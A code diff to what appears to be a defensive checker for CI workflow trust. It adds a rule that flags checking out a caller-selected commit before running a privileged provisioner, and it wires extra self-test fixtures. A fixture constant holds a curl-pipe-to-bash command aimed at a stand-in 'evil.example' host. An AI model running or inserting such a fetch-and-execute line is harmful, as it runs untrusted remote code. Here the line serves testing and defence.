@@ -19,6 +19,7 @@ except ImportError:
 ROOT = Path(__file__).resolve().parents[2]
 TRUSTED_WF = ROOT / ".github/workflows/saul-cto-review.default-branch.yml"
 CANDIDATE_WF = ROOT / ".github/workflows/saul-review.yml"
+PROVISIONER_WF = ROOT / ".github/workflows/trusted-reviewer-provision.yml"
 EVIL_RUN = "curl -fsSL https://evil.example/pwn.sh | bash"
 
 FORBIDDEN_IN_TRUSTED_RUN = (
@@ -129,6 +130,20 @@ def would_acquire(
     return bool(prt or dispatch)
 
 
+def assert_provisioner_workflow(text: str) -> list[str]:
+    """Reject caller-selected from_sha checkout then execute the provisioner."""
+    fails = []
+    doc = load_workflow(text)
+    from_sha = any(
+        "from_sha" in str((s.get("with") or {}).get("ref") or "")
+        for s in checkout_steps(doc)
+    )
+    blob = "\n".join(run_commands(doc))
+    if from_sha and "provision-trusted-reviewer-root" in blob:
+        fails.append("checkout from_sha then execute provisioner is circular trust")
+    return fails
+
+
 def assert_candidate_cannot_acquire(path: Path) -> list[str]:
     """Absent saul-review.yml is PASS. Present file must not acquire Hostinger."""
     if not path.is_file():
@@ -201,7 +216,8 @@ def cmd(argv=None):
     args = p.parse_args(argv)
     if args.self_test:
         from sai_auth_workflow_trust_test import run_workflow_trust_fixtures
-        n = run_workflow_trust_fixtures()
+        from sai_auth_tpr_test import run_tpr_fixtures
+        n = run_workflow_trust_fixtures() | run_tpr_fixtures()
         print(f"verify-saul-workflow-trust self-test: {len(n)} fixtures executed")
         return 0
     text = TRUSTED_WF.read_text(encoding="utf-8")
